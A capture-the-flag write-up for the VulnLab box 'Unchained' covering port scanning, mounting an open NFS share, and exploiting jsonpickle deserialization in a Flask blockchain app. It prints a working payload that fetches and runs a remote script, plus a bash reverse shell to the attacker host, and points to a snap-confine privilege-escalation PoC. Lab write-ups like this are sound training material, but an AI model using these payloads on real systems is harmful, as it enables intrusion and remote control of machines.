---
title: VulnLab Unchained
description: VulnLab Unchained
image:
  path: unchained.png
categories:
- VulnLab Boxes
layout: post
media_subpath: /assets/posts/labs/vulnlab/boxes/unchained
tags:
- vulnlab-boxes
---
# Unchained
## Recon
```
└─$ rustscan -a 10.10.68.156 -r 1-65535 -g 
10.10.68.156 -> [22,111,2049,8000,13025]
```
```
└─$ nmap -sC -sV -p22,111,2049,8000,13025 10.10.68.156
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-19 22:39 +06
Nmap scan report for 10.10.68.156
Host is up (0.093s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 52:4b:a2:02:01:3f:c4:06:84:22:94:11:42:55:73:46 (RSA)
|   256 88:19:82:9b:38:b0:50:94:29:fb:a7:63:4f:67:8d:df (ECDSA)
|_  256 b0:eb:41:ab:08:d1:10:bf:67:0c:3e:80:09:1b:79:b4 (ED25519)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      13025/tcp   mountd
|   100005  1,2,3      13025/tcp6  mountd
|   100005  1,2,3      13025/udp   mountd
|   100005  1,2,3      13025/udp6  mountd
|   100021  1,3,4      37372/udp6  nlockmgr
|   100021  1,3,4      43263/tcp6  nlockmgr
|   100021  1,3,4      44299/tcp   nlockmgr
|   100021  1,3,4      56377/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs     3-4 (RPC #100003)
8000/tcp  open  http    Werkzeug httpd 2.0.3 (Python 3.8.10)
|_http-server-header: Werkzeug/2.0.3 Python/3.8.10
|_http-title: 404 Not Found
13025/tcp open  mountd  1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds

```

## User
We see nfs
```
└─$ showmount -e 10.10.68.156
Export list for 10.10.68.156:
/var/nfs/backup *
```
Let's mount it and see the contents
```
└─$ sudo mount -t nfs 10.10.68.156:/var/nfs/backup /mnt/nfs -nolock
```
```
└─$ ls -lha /mnt/nfs             
total 24K
drwxr-xr-x 2 nobody nogroup 4.0K Feb 26  2022 .
drwxr-xr-x 6 root   root    4.0K May 18 22:23 ..
-rw-r--r-- 1 root   root     13K Feb 26  2022 code.zip
```
Let's download the zip and check it
```
└─$ unzip code.zip 
Archive:  code.zip
   creating: code/
  inflating: code/SocketConnector.py  
  inflating: code/NodeAPI.py         
  inflating: code/Block.py           
  inflating: code/Blockchain.py      
  inflating: code/SocketCommunication.py  
  inflating: code/ProofOfStake.py    
  inflating: code/PeerDiscoveryHandler.py  
  inflating: code/Lot.py             
  inflating: code/Main.py            
  inflating: code/TransactionPool.py  
  inflating: code/info.txt           
  inflating: code/Wallet.py          
  inflating: code/Transaction.py     
  inflating: code/Interaction.py     
  inflating: code/Node.py            
  inflating: code/Test.py            
  inflating: code/Message.py         
  inflating: code/AccountModel.py    
   creating: code/keys/
  inflating: code/keys/genesisPrivateKey.pem  
  inflating: code/keys/stakerPrivateKey.pem  
  inflating: code/keys/genesisPublicKey.pem  
  inflating: code/BlockchainUtils.py  

```

Looks like it's a Flask application based on `NodeAPI.py`. 

![](1.png)

After reviewing the code, we can find that route `/transaction` which receives and handles user input utilizes `BlockchainUtils.decode()` from `BlockchainsUtils.py`. The function uses `jsonpickle` to decode the input value. 

![](2.png)

We can try using the following [repository](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) to generate our payload, but no success. After googling more, we can find working payload from this [blog](https://medium.com/@0xbughunter/de-serialization-sometimes-pickle-can-be-too-sour-45c930e18b8e). Escape `"` before sending the payload via Burp
```
{\"py/object\": \"__builtin__.eval\", \"py/initargs\": {\"py/tuple\": [\"__import__('subprocess').Popen('curl 10.8.4.147/shell | bash', shell=True)\"]}}
```
```
└─$ cat shell                
/bin/bash -i >& /dev/tcp/10.8.4.147/443 0>&1
```

After sending the payload we receive our shell

![](3.png)

![](4.png)

## Root
After enumeration we can see that vulnerable `snap-confine` version available on the system. Thus we can try abusing [CVE-2021-44730](https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt) to get the `root` user. There's a nice [PoC](https://notes.secure77.de/OFFSEC-Notes/Linux-Related/CVEs/CVE~2021~44730-(snap~confine,-dirty-socks)) to achive this

[https://api.vulnlab.com/api/v1/share?id=e6be5db5-6013-4c38-a0bd-80aef9994aaf](https://api.vulnlab.com/api/v1/share?id=e6be5db5-6013-4c38-a0bd-80aef9994aaf)